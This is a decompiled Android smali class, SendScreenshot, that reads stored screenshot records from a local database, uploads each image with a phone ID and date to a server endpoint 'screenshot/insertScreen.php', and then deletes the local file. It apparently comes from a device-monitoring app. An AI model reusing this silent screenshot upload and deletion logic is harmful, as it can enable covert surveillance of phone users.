.class public final Lem;
.super Ljava/lang/Object;
.source "SendScreenshot.java"

# interfaces
.implements Ljava/lang/Runnable;


# static fields
.field private static a:Z


# instance fields
.field private final b:Landroid/content/Context;


# direct methods
.method public constructor <init>(Landroid/content/Context;)V
    .locals 0

    .line 29
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 30
    iput-object p1, p0, Lem;->b:Landroid/content/Context;

    return-void
.end method

.method private a()V
    .locals 4

    .line 118
    :try_start_0
    invoke-static {}, Lcom/app/service/UploadDataService;->a()V

    .line 120
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "UploadDataService.getmNbTask() : "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {}, Lcom/app/service/UploadDataService;->b()I

    move-result v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    .line 122
    invoke-static {}, Lcom/app/service/UploadDataService;->b()I

    move-result v0

    if-gtz v0, :cond_0

    .line 123
    iget-object v0, p0, Lem;->b:Landroid/content/Context;

    new-instance v1, Landroid/content/Intent;

    iget-object v2, p0, Lem;->b:Landroid/content/Context;

    const-class v3, Lcom/app/service/UploadDataService;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v1}, Landroid/content/Context;->stopService(Landroid/content/Intent;)Z
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    :cond_0
    return-void

    :catch_0
    move-exception v0

    .line 126
    invoke-static {v0}, Lcom/crashlytics/android/Crashlytics;->logException(Ljava/lang/Throwable;)V

    return-void
.end method

.method private a(Lbh;Lch;)V
    .locals 4

    .line 102
    :try_start_0
    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    const-string v1, "idPhone"

    .line 103
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v3, p0, Lem;->b:Landroid/content/Context;

    invoke-static {v3}, Lda;->f(Landroid/content/Context;)I

    move-result v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v1, "date"

    .line 5035
    iget-object v2, p1, Lbh;->d:Ljava/lang/String;

    .line 104
    invoke-virtual {v0, v1, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v1, "data"

    .line 6027
    iget-object v2, p1, Lbh;->b:Ljava/lang/String;

    .line 105
    invoke-virtual {v0, v1, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v1, "screenshot/insertScreenError.php"

    .line 107
    invoke-static {v1, v0}, Lcv;->a(Ljava/lang/String;Ljava/util/Map;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 7019
    iget p1, p1, Lbh;->a:I

    .line 108
    invoke-virtual {p2, p1}, Lch;->a(I)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_0
    return-void

    :catch_0
    move-exception p1

    .line 111
    invoke-virtual {p1}, Ljava/lang/Exception;->getStackTrace()[Ljava/lang/StackTraceElement;

    .line 112
    invoke-static {p1}, Lcom/crashlytics/android/Crashlytics;->logException(Ljava/lang/Throwable;)V

    return-void
.end method


# virtual methods
.method public final declared-synchronized run()V
    .locals 14

    monitor-enter p0

    const/4 v0, 0x0

    .line 36
    :try_start_0
    sget-boolean v1, Lem;->a:Z

    if-eqz v1, :cond_0

    .line 37
    invoke-direct {p0}, Lem;->a()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 38
    monitor-exit p0

    return-void

    :cond_0
    const/4 v1, 0x1

    .line 41
    :try_start_1
    sput-boolean v1, Lem;->a:Z

    .line 43
    new-instance v2, Lch;

    iget-object v3, p0, Lem;->b:Landroid/content/Context;

    invoke-direct {v2, v3}, Lch;-><init>(Landroid/content/Context;)V

    .line 44
    invoke-virtual {v2}, Lch;->a()V

    .line 1052
    iget-object v4, v2, Lch;->a:Landroid/database/sqlite/SQLiteDatabase;

    const-string v5, "TABLE_CONFIG_SCREENSHOT"

    const/4 v3, 0x4

    new-array v6, v3, [Ljava/lang/String;

    const-string v3, "id"

    aput-object v3, v6, v0

    const-string v3, "picture"

    aput-object v3, v6, v1

    const-string v3, "uploadedfile"

    const/4 v12, 0x2

    aput-object v3, v6, v12

    const-string v3, "date"

    const/4 v13, 0x3

    aput-object v3, v6, v13

    const/4 v7, 0x0

    const/4 v8, 0x0

    const/4 v9, 0x0

    const/4 v10, 0x0

    const/4 v11, 0x0

    invoke-virtual/range {v4 .. v11}, Landroid/database/sqlite/SQLiteDatabase;->query(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v3

    if-eqz v3, :cond_4

    .line 50
    invoke-interface {v3}, Landroid/database/Cursor;->getCount()I

    move-result v4

    if-lez v4, :cond_4

    .line 51
    invoke-interface {v3}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v4

    if-eqz v4, :cond_4

    .line 53
    :cond_1
    new-instance v4, Lbh;

    invoke-direct {v4}, Lbh;-><init>()V

    .line 54
    invoke-interface {v3, v0}, Landroid/database/Cursor;->getInt(I)I

    move-result v5

    .line 2023
    iput v5, v4, Lbh;->a:I

    .line 55
    invoke-interface {v3, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v5

    .line 2031
    iput-object v5, v4, Lbh;->b:Ljava/lang/String;

    .line 56
    invoke-interface {v3, v12}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v5

    .line 2047
    iput-object v5, v4, Lbh;->c:Ljava/lang/String;

    .line 57
    invoke-interface {v3, v13}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v5

    .line 3039
    iput-object v5, v4, Lbh;->d:Ljava/lang/String;

    .line 3043
    iget-object v5, v4, Lbh;->c:Ljava/lang/String;

    .line 59
    invoke-static {v5}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v5

    if-nez v5, :cond_2

    .line 62
    new-instance v5, Ljava/util/HashMap;

    invoke-direct {v5}, Ljava/util/HashMap;-><init>()V

    const-string v6, "idPhone"

    .line 63
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v8, p0, Lem;->b:Landroid/content/Context;

    invoke-static {v8}, Lda;->f(Landroid/content/Context;)I

    move-result v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-static {v7}, Ldh;->a(Ljava/lang/String;)Lare;

    move-result-object v7

    invoke-virtual {v5, v6, v7}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v6, "pathFile"

    .line 4027
    iget-object v7, v4, Lbh;->b:Ljava/lang/String;

    .line 64
    invoke-static {v7}, Ldh;->a(Ljava/lang/String;)Lare;

    move-result-object v7

    invoke-virtual {v5, v6, v7}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v6, "date"

    .line 4035
    iget-object v7, v4, Lbh;->d:Ljava/lang/String;

    .line 65
    invoke-static {v7}, Ldh;->a(Ljava/lang/String;)Lare;

    move-result-object v7

    invoke-virtual {v5, v6, v7}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 67
    new-instance v6, Ljava/io/File;

    .line 4043
    iget-object v7, v4, Lbh;->c:Ljava/lang/String;

    .line 67
    invoke-direct {v6, v7}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 69
    invoke-virtual {v6}, Ljava/io/File;->exists()Z

    move-result v7

    if-eqz v7, :cond_2

    const-string v7, "multipart/form-data"

    .line 70
    invoke-static {v7}, Laqy;->b(Ljava/lang/String;)Laqy;

    move-result-object v7

    invoke-static {v7, v6}, Lare;->create(Laqy;Ljava/io/File;)Lare;

    move-result-object v7

    const-string v8, "uploadedfile"

    .line 71
    invoke-virtual {v6}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v9

    invoke-static {v8, v9, v7}, Laqz$b;->a(Ljava/lang/String;Ljava/lang/String;Lare;)Laqz$b;

    move-result-object v7

    const-string v8, "screenshot/insertScreen.php"

    .line 73
    invoke-static {v8, v5, v7}, Lcv;->a(Ljava/lang/String;Ljava/util/HashMap;Laqz$b;)Z

    move-result v5

    if-eqz v5, :cond_3

    .line 5019
    iget v4, v4, Lbh;->a:I

    .line 74
    invoke-virtual {v2, v4}, Lch;->a(I)Z

    move-result v4

    if-eqz v4, :cond_3

    .line 75
    invoke-virtual {v6}, Ljava/io/File;->exists()Z

    move-result v4

    if-eqz v4, :cond_3

    .line 76
    invoke-virtual {v6}, Ljava/io/File;->delete()Z

    goto :goto_0

    .line 81
    :cond_2
    invoke-direct {p0, v4, v2}, Lem;->a(Lbh;Lch;)V

    .line 84
    :cond_3
    :goto_0
    invoke-interface {v3}, Landroid/database/Cursor;->moveToNext()Z

    move-result v4

    if-nez v4, :cond_1

    .line 87
    :cond_4
    invoke-virtual {v2}, Lch;->b()V

    if-eqz v3, :cond_5

    .line 90
    invoke-interface {v3}, Landroid/database/Cursor;->close()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    goto :goto_1

    :catchall_0
    move-exception v0

    goto :goto_2

    :catch_0
    move-exception v1

    .line 93
    :try_start_2
    invoke-virtual {v1}, Ljava/lang/Exception;->getStackTrace()[Ljava/lang/StackTraceElement;

    .line 96
    :cond_5
    :goto_1
    sput-boolean v0, Lem;->a:Z

    .line 97
    invoke-direct {p0}, Lem;->a()V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    .line 98
    monitor-exit p0

    return-void

    :goto_2
    monitor-exit p0

    throw v0

    return-void
.end method
